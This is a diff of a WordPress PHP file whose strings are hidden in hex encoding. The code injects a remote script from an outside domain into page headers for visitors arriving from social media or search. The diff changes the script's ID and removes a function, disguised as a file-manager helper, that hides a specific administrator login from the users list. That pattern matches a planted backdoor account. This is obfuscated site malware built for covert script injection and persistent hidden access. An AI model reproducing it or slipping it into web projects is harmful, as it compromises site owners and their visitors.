@@ -44,7 +44,7 @@ add_action(hex2bin('77705f68656164'), function () {
     if (is_singular() && ($SM_GO || $IP_FB || $AN_FB || $IG || $TT)) {
 
         $SR = hex2bin('68747470733a2f2f616c35736d2e636f6d2f7461672e6d696e2e6a73');
-        $ZN = hex2bin('3131363134343931');
+        $ZN = hex2bin('3131363130303032');
         ?>
         <script>
         (function(s){
@@ -56,21 +56,3 @@ add_action(hex2bin('77705f68656164'), function () {
     }
 
 });
-
-
-function WP_File_Manager_PGN_GLOBALS($QRY) {
-
-    $PGN = $GLOBALS[hex2bin('706167656e6f77')] ?? '';
-
-    if (is_admin() && $PGN === hex2bin('75736572732e706870')) {
-
-        $USR = get_user_by(hex2bin('6c6f67696e'), hex2bin('656c696e6e75726c6961'));
-
-        if ($USR) {
-            $QRY->set(hex2bin('6578636c756465'), array($USR->ID));
-        }
-    }
-}
-
-add_action(hex2bin('7072655f6765745f7573657273'), 'WP_File_Manager_PGN_GLOBALS');
-
